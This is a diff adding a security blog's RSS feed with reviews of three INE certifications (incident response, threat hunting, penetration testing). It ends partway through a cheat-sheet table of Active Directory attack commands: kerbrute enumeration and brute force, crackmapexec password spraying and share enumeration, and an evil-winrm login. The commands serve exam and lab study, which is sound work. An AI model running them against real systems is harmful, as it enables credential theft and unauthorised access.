@@ -1,0 +1,541 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Certification on Roberto D'Andrea</title><link>https://robertodandrea.com/categories/certification/</link><description>Recent content in Certification on Roberto D'Andrea</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 30 Aug 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://robertodandrea.com/categories/certification/index.xml" rel="self" type="application/rss+xml"/><item><title>Certified Incident Responder eCIR Review - INE</title><link>https://robertodandrea.com/post/ine/certified-incident-responder-ecir-review-ine/</link><pubDate>Sat, 30 Aug 2025 00:00:00 +0000</pubDate><guid>https://robertodandrea.com/post/ine/certified-incident-responder-ecir-review-ine/</guid><description>&lt;p&gt;The &lt;strong&gt;Certified Incident Responder (eCIR)&lt;/strong&gt; by INE is a certification designed for professionals specializing in incident response and forensic investigations.&lt;/p&gt;
+&lt;p&gt;This certification is tailored for cybersecurity practitioners who aim to deepen their skills in identifying, containing, and remediating security incidents effectively. Priced at &lt;strong&gt;400$&lt;/strong&gt;, the certification includes a practical exam lasting &lt;strong&gt;two days&lt;/strong&gt;, followed by an additional &lt;strong&gt;two days&lt;/strong&gt; to submit the final report detailing your findings.&lt;/p&gt;
+&lt;p&gt;This review includes personal notes and an example of the methodologies applied during the exam.&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡 Personal Notes on the Course Content
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;In this section, I’ve included some of my notes to help guide others studying for the eCIR certification.
+These notes summarize key takeaways from each module, covering essential techniques, tools, and strategies for threat hunting within networks and endpoints.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;eCIR Certification Notes&lt;/strong&gt; → &lt;a class="link" href="https://www.notion.so/robertodandrea/eCIR-Certification-Notes-13f6583d22bc8011b509deb641f4ad0d?source=copy_link" target="_blank" rel="noopener"
+&gt;eCIR Notes&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;h3 id="certification-breakdown"&gt;Certification Breakdown
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Incident Preparedness and Management&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Learn to design and implement incident response plans.&lt;/li&gt;
+&lt;li&gt;Key topics include identifying &lt;strong&gt;Indicators of Attack (IoA)&lt;/strong&gt; and &lt;strong&gt;Indicators of Compromise (IoC)&lt;/strong&gt; and leveraging automated playbooks for response.&lt;/li&gt;
+&lt;li&gt;Focus is placed on integrating frameworks like &lt;strong&gt;NIST&lt;/strong&gt; and &lt;strong&gt;MITRE ATT&amp;amp;CK&lt;/strong&gt; into workflows.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Threat Intelligence Integration&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Leverage tools such as &lt;strong&gt;Splunk&lt;/strong&gt; and &lt;strong&gt;ELK (Elastic)&lt;/strong&gt; for correlation, log aggregation, and monitoring threat intelligence feeds.&lt;/li&gt;
+&lt;li&gt;Hands-on practice includes creating custom dashboards to visualize incidents and measure their impact.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id="exam-structure"&gt;Exam Structure
+&lt;/h3&gt;&lt;p&gt;The &lt;strong&gt;eCIR certification exam&lt;/strong&gt; is divided into two &lt;strong&gt;hands-on parts&lt;/strong&gt;, simulating real-world incident response scenarios:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Part 1: Splunk&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Focuses on using Splunk to analyze compromises that occurred on specific endpoints within a network.&lt;/li&gt;
+&lt;li&gt;Candidates must identify anomalies and understand how the compromise propagated through the environment.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Part 2: ELK&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Centers on leveraging the ELK stack for log correlation and advanced analysis.&lt;/li&gt;
+&lt;li&gt;A &lt;strong&gt;PCAP file&lt;/strong&gt; is provided in this part, containing captured traffic from the attack, which must be analyzed to extract critical details about the intrusion.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Candidates are required to document their findings in a comprehensive report, demonstrating their ability to follow a structured methodology. This report must be submitted within &lt;strong&gt;two days&lt;/strong&gt; of completing the practical portion.&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡 Personal Tips for Success
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+This certification, in my experience, presents a medium-to-low difficulty level, especially if you are already familiar with tools like Splunk, ELK and Wireshark.
+My approach was to methodically investigate each host present in the network by analyzing possible Windows Security Log Events.
+From there, I built my understanding and followed up with targeted investigations, leveraging my prior knowledge of these tools. The hands-on nature of the exam and the need for a structured methodology made the process both challenging and rewarding.
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Master Core Tools&lt;/strong&gt;: Familiarize yourself deeply with Splunk, ELK. Focus on advanced features like custom queries, regex, and anomaly detection patterns.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Analyze PCAP Files&lt;/strong&gt;: Practice using tools like Wireshark to analyze network traffic, especially for identifying malicious communications.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Time Management&lt;/strong&gt;: Allocate time for each part of the exam and reserve a buffer for writing the report.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Leverage MITRE ATT&amp;amp;CK&lt;/strong&gt;: Use this framework to map attack techniques and provide structured context in your report.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Take Detailed Notes&lt;/strong&gt;: During the labs, document every step. These notes will help streamline your report writing and ensure you don’t miss critical details.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/ine/certified-incident-responder-ecir-review-ine/eCIR_DANDREA.png"
+width="1312"
+height="902"
+srcset="https://robertodandrea.com/post/ine/certified-incident-responder-ecir-review-ine/eCIR_DANDREA_hu_3a9713e27d8b85bd.png 480w, https://robertodandrea.com/post/ine/certified-incident-responder-ecir-review-ine/eCIR_DANDREA_hu_c1738ae91f491039.png 1024w"
+loading="lazy"
+alt="eCIR certification"
+class="gallery-image"
+data-flex-grow="145"
+data-flex-basis="349px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class="link" href="eCIR_Letter_of_Engagement.pdf" &gt;Letter of Engagement (PDF)&lt;/a&gt;
+&lt;a class="link" href="scenario2-traffic-capture.pcap" &gt;Wireshark (PCAP)&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;INE&amp;rsquo;s &lt;strong&gt;eCIR certification&lt;/strong&gt; is an excellent opportunity for cybersecurity professionals to enhance their incident response and forensic skills. By mastering tools like &lt;code&gt;Splunk&lt;/code&gt;, &lt;code&gt;ELK&lt;/code&gt; and &lt;code&gt;Wireshark&lt;/code&gt;, candidates gain practical expertise in handling real-world security incidents.&lt;/p&gt;
+&lt;p&gt;With its focus on hands-on learning, structured methodologies, and real-world data analysis (including PCAP files), the certification provides invaluable insights into modern incident response practices.&lt;/p&gt;</description></item><item><title>Certified Threat Hunting Professional v2 (eCTHPv2) Review - INE</title><link>https://robertodandrea.com/post/ine/certified-threat-hunting-professional-v2-ecthpv2-review-ine/</link><pubDate>Wed, 06 Aug 2025 00:00:00 +0000</pubDate><guid>https://robertodandrea.com/post/ine/certified-threat-hunting-professional-v2-ecthpv2-review-ine/</guid><description>&lt;p&gt;The &lt;strong&gt;Certified Threat Hunting Professional v2 (eCTHPv2)&lt;/strong&gt; by INE is a certification designed for security professionals focused on threat hunting.&lt;/p&gt;
+&lt;p&gt;This certification is ideal for security analysts and threat hunters who wish to learn in-depth techniques for identifying malicious activities across network and endpoint environments. Priced at &lt;strong&gt;$399&lt;/strong&gt;, the certification includes a practical exam and requires a final report, to be completed within two days post-exam.
+This guide includes notes and an example of the exam I completed.&lt;/p&gt;
+&lt;p&gt;This certification is broken down into three main areas:&lt;/p&gt;
+&lt;h3 id="course-structure-and-certification-details"&gt;Course Structure and Certification Details
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Introduction to Threat Hunting&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;This section introduces core &lt;strong&gt;threat hunting&lt;/strong&gt; concepts, life cycles of threats, and detection methodologies. Key topics include identifying &lt;strong&gt;Indicators of Compromise (IoC)&lt;/strong&gt; and building threat-hunting hypotheses.&lt;/li&gt;
+&lt;li&gt;A crucial part is understanding threat behaviors and utilizing frameworks like &lt;strong&gt;MITRE ATT&amp;amp;CK&lt;/strong&gt; to create a structured approach.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Hunting the Network &amp;amp; Network Analysis&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;This part focuses on network traffic analysis and techniques for spotting suspicious patterns. Practical insights are given into monitoring network data using &lt;strong&gt;Splunk&lt;/strong&gt; and understanding packet analysis.&lt;/li&gt;
+&lt;li&gt;The module covers spotting lateral movement and data exfiltration signs.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Hunting the Endpoint &amp;amp; Endpoint Analysis&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Here, emphasis is on endpoint analysis, covering tools like &lt;strong&gt;Volatility&lt;/strong&gt; for memory analysis and &lt;strong&gt;ELK (Elastic)&lt;/strong&gt; for log analysis, focusing on detecting malware indicators and suspicious activity on endpoints.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡 Personal Notes on the Course Content
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;n this section, I’ve included some of my notes to help guide others studying for the eCTHPv2 certification.
+These notes summarize key takeaways from each module, covering essential techniques, tools, and strategies for threat hunting within networks and endpoints.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;eCTHPv2 Certification Notes&lt;/strong&gt; → &lt;a class="link" href="https://robertodandrea.notion.site/eCTHPv2-Notes-3feb4008746f4cb6b1b37acbebbc130a?pvs=74" target="_blank" rel="noopener"
+&gt;eCTHP Notes&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;h3 id="exam-details"&gt;Exam Details
+&lt;/h3&gt;&lt;p&gt;The eCTHPv2 exam consists of three &lt;strong&gt;hands-on labs&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Splunk&lt;/strong&gt;: For log monitoring and network traffic analysis.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Volatility&lt;/strong&gt;: For forensics and memory analysis.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ELK (Elastic)&lt;/strong&gt;: For system log management and analysis.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;After completing these labs, you have &lt;strong&gt;two days&lt;/strong&gt; to complete the exam and an additional &lt;strong&gt;two days&lt;/strong&gt; to submit the final report, which must detail your findings and conclusions from the hunting activities.&lt;/p&gt;
+&lt;h3 id="tips-for-success"&gt;Tips for Success
+&lt;/h3&gt;&lt;p&gt;Since you’re already familiar with &lt;strong&gt;Splunk&lt;/strong&gt; and &lt;strong&gt;ELK&lt;/strong&gt;, here are some focused tips:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Review the MITRE ATT&amp;amp;CK Framework&lt;/strong&gt;: Get well-acquainted with common attack techniques. This framework will support you in your report, especially when describing threat-hunting processes.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Maximize Tool Knowledge&lt;/strong&gt;: Even if you know Splunk and ELK well, delve deeper into filtering techniques, regex for complex queries, and setting up customized dashboards and alerts.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Thorough Documentation&lt;/strong&gt;: During the labs, take meticulous notes. The final report should detail not just results but also your methodologies to demonstrate a structured approach.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Time Management&lt;/strong&gt;: Plan each lab’s activities and reserve time for report review to meet the certification’s strict deadlines.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Practice with Real Scenarios&lt;/strong&gt;: Aside from course materials, practice with realistic case studies to solidify your knowledge, especially in network and endpoint analysis.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/ine/certified-threat-hunting-professional-v2-ecthpv2-review-ine/eCTHP_DANDREA.png"
+width="1218"
+height="860"
+srcset="https://robertodandrea.com/post/ine/certified-threat-hunting-professional-v2-ecthpv2-review-ine/eCTHP_DANDREA_hu_137bdc2ff3afc845.png 480w, https://robertodandrea.com/post/ine/certified-threat-hunting-professional-v2-ecthpv2-review-ine/eCTHP_DANDREA_hu_3c6c74a728fa2bcd.png 1024w"
+loading="lazy"
+alt="eCTHP certification"
+class="gallery-image"
+data-flex-grow="141"
+data-flex-basis="339px"
+&gt;&lt;/p&gt;
+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;INE&amp;rsquo;s eCTHPv2 provides significant hands-on experience in threat hunting, emphasizing proactive response to network and endpoint threats. By mastering tools like &lt;code&gt;Splunk&lt;/code&gt;, &lt;code&gt;Volatility&lt;/code&gt;, and &lt;code&gt;ELK&lt;/code&gt;, this certification enhances your ability to detect and analyze anomalies in an enterprise setting.
+The hands-on labs and structured threat-hunting techniques make it a comprehensive choice for anyone serious about advancing their skills in cybersecurity and threat detection.&lt;/p&gt;</description></item><item><title>Certified Professional Penetration Tester (eCPPTv3) - INE</title><link>https://robertodandrea.com/post/ine/certified-professional-penetration-tester-ecpptv3-ine/</link><pubDate>Tue, 28 Jan 2025 00:00:00 +0000</pubDate><guid>https://robertodandrea.com/post/ine/certified-professional-penetration-tester-ecpptv3-ine/</guid><description>&lt;h1 id="certified-professional-penetration-tester-ecpptv3---ine"&gt;Certified Professional Penetration Tester (eCPPTv3) - INE
+&lt;/h1&gt;&lt;p&gt;The &lt;strong&gt;Certified Professional Penetration Tester (eCPPTv3)&lt;/strong&gt; by INE is a practical certification designed for professionals specializing in penetration testing and ethical hacking. This certification is ideal for those looking to deepen their skills in identifying and mitigating security vulnerabilities.&lt;/p&gt;
+&lt;p&gt;The certification is priced at &lt;strong&gt;400$&lt;/strong&gt; and includes a practical exam lasting &lt;strong&gt;24 hours&lt;/strong&gt;, during which you are required to complete penetration testing activities and answer 45 questions based on your findings.&lt;/p&gt;
+&lt;p&gt;This review includes personal notes and an example of the methodologies applied during the exam.&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡 Personal Notes on the Course Content
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;In this section, I’ve included some of my notes to help guide others studying for the eCPPTv3 certification.
+These notes summarize key takeaways from each module, covering essential techniques, tools, and strategies for threat hunting within networks and endpoints.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;eCPPT Notes&lt;/strong&gt; → &lt;a class="link" href="https://robertodandrea.notion.site/eCPPT-Certification-a979ec3064e34ed6bb9690efd8ffd176?pvs=74" target="_blank" rel="noopener"
+&gt;eCPPT Notes&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;h3 id="exam-structure"&gt;&lt;strong&gt;Exam Structure:&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;The exam is divided into two main components:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Lab Environment&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;You will be provided with a virtual environment containing various systems, including Linux and Windows hosts, such as Windows servers acting as Domain Controllers.&lt;/li&gt;
+&lt;li&gt;Your objective is to identify and exploit vulnerabilities within this environment to gain unauthorized access.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Lab Questions&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;After compromising the environment, you will answer 45 questions related to your activities and findings during the penetration test.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The exam is to be completed within &lt;strong&gt;24 hours&lt;/strong&gt;, and you are required to submit your answers to the questions within this timeframe. Unlike previous versions, there is no requirement to submit a detailed report of your activities and findings.&lt;/p&gt;
+&lt;h3 id="exam-objectives"&gt;&lt;strong&gt;Exam Objectives:&lt;/strong&gt;
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Information Gathering &amp;amp; Reconnaissance (10%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Perform host discovery and port scanning on target networks.&lt;/li&gt;
+&lt;li&gt;Enumerate information from services running on open ports.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Initial Access (15%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Perform username enumeration to identify valid user accounts on target systems.&lt;/li&gt;
+&lt;li&gt;Perform password spraying attacks to identify valid credentials for initial access.&lt;/li&gt;
+&lt;li&gt;Perform brute-force attacks on remote access services for initial access.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Web Application Penetration Testing (15%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Perform web application enumeration to identify potential vulnerabilities and misconfigurations.&lt;/li&gt;
+&lt;li&gt;Identify and exploit common web application vulnerabilities for initial access (e.g., SQL injection, cross-site scripting, command injection).&lt;/li&gt;
+&lt;li&gt;Perform brute-force attacks against login forms.&lt;/li&gt;
+&lt;li&gt;Exploit vulnerable and outdated web application components.&lt;/li&gt;
+&lt;li&gt;Exfiltrate data and credentials from compromised web applications and databases.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Exploitation &amp;amp; Post-Exploitation (25%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Identify and exploit vulnerabilities or misconfigurations in services.&lt;/li&gt;
+&lt;li&gt;Identify and exploit privilege escalation vulnerabilities.&lt;/li&gt;
+&lt;li&gt;Dump and crack password hashes.&lt;/li&gt;
+&lt;li&gt;Identify insecurely stored credentials.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Exploit Development (5%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Develop or modify exploit code for initial access and post-exploitation.&lt;/li&gt;
+&lt;li&gt;Identify and exploit memory corruption vulnerabilities (e.g., stack overflow, buffer overflow).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Active Directory Penetration Testing (30%)&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Perform information gathering on Active Directory.&lt;/li&gt;
+&lt;li&gt;Perform enumeration attacks on Active Directory.&lt;/li&gt;
+&lt;li&gt;Exploit Active Directory vulnerabilities.&lt;/li&gt;
+&lt;li&gt;Perform privilege escalation attacks in Active Directory.&lt;/li&gt;
+&lt;li&gt;Perform lateral movement attacks in Active Directory.&lt;/li&gt;
+&lt;li&gt;Perform persistence attacks in Active Directory.&lt;/li&gt;
+&lt;li&gt;Perform data exfiltration attacks in Active Directory.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id="personal-tips-for-success"&gt;Personal Tips for Success
+&lt;/h3&gt;&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;This certification, in my experience, presents a medium-to-high difficulty level, especially if you are not familiar with Active Directory (AD). The exam focuses significantly on AD exploitation techniques, making it essential to have a solid understanding of AD environments.&lt;/p&gt;
+&lt;p&gt;To enhance your preparation, engaging with platforms like &lt;a class="link" href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank" rel="noopener"
+&gt;**GOAD&lt;/a&gt; (Game of Active Directory)** can be highly beneficial. GOAD provides a vulnerable AD environment, ideal for practicing common attack techniques. Detailed documentation and guides on tackling GOAD challenges are available on Mayfly277&amp;rsquo;s website.&lt;/p&gt;
+&lt;p&gt;Additionally, platforms such as &lt;strong&gt;Hack The Box&lt;/strong&gt; offer practical labs that can be extremely useful. Specifically, the machines &lt;strong&gt;SAUNA&lt;/strong&gt;, &lt;strong&gt;ACTIVE&lt;/strong&gt;, and &lt;strong&gt;TIMELAPSE&lt;/strong&gt; are designed to practice AD exploitation techniques. These labs allow you to refine your skills in a controlled and challenging environment.&lt;/p&gt;
+&lt;p&gt;Another valuable resource is the mind map provided by Orange Cyberdefense, which offers a clear overview of AD penetration testing techniques.
+This mind map will help you visualize the various phases and tools necessary to approach the exam successfully.&lt;/p&gt;
+&lt;p&gt;&lt;a class="link" href="https://orange-cyberdefense.github.io/ocd-mindmaps/" target="_blank" rel="noopener"
+&gt;https://orange-cyberdefense.github.io/ocd-mindmaps/&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;h3 id="table-of-useful-command"&gt;Table of useful command
+&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;Tool&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;cmd&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;kerbrute&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Enumerate / brute force / password spray&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Enumeration:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;kerbrute userenum -d example.local &amp;ndash;dc 192.168.1.10 users.txt&lt;/em&gt;&lt;br&gt;&lt;strong&gt;BruteForce:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;kerbrute bruteuser -d example.local &amp;ndash;dc 192.168.1.10 administrator passwords.txt&lt;/em&gt;&lt;br&gt;&lt;strong&gt;User list file:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;users.txt&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;crackmapexec&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Enum hosts&lt;br&gt;Enum null session&lt;br&gt;Enum anonymous access&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Get password Policy:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;cme &lt;IP&gt; -u ‘user’ -p ‘password’ &amp;ndash;pass-pol&lt;/em&gt;&lt;br&gt;&lt;strong&gt;Username but NO pwd:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;cme smb &amp;lt;dc_ip&amp;gt; -u user.txt -p password.txt &amp;ndash;no-bruteforce&lt;/em&gt;&lt;br&gt;&lt;strong&gt;Valid Credential:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;cme smb &lt;IP&gt; -u &lt;user&gt; -p &amp;lsquo;&amp;lt;password_from_before&amp;gt;&amp;rsquo; &amp;ndash;users&lt;/em&gt;&lt;br&gt;&lt;em&gt;cme smb &lt;IP&gt; -u &lt;user&gt; -p &amp;lsquo;&amp;lt;password_from_before&amp;gt;&amp;rsquo; &amp;ndash;shares&lt;/em&gt;&lt;br&gt;&lt;strong&gt;Enumeration:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;crackmapexec smb &lt;IP&gt;&lt;/em&gt;&lt;br&gt;&lt;em&gt;crackmapexec smb &lt;IP&gt; -u &amp;lsquo;a&amp;rsquo; -p &amp;lsquo;&amp;rsquo;&lt;/em&gt;&lt;br&gt;&lt;strong&gt;Lateral Movement:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;evil-winrm&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Access to target machine&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Lateral Movement:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;evil-winrm -i 192.168.1.100 -u Administrator -p &amp;lsquo;Password123&amp;rsquo;&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;xfreerdp&lt;/code&gt;&lt;/td&gt;
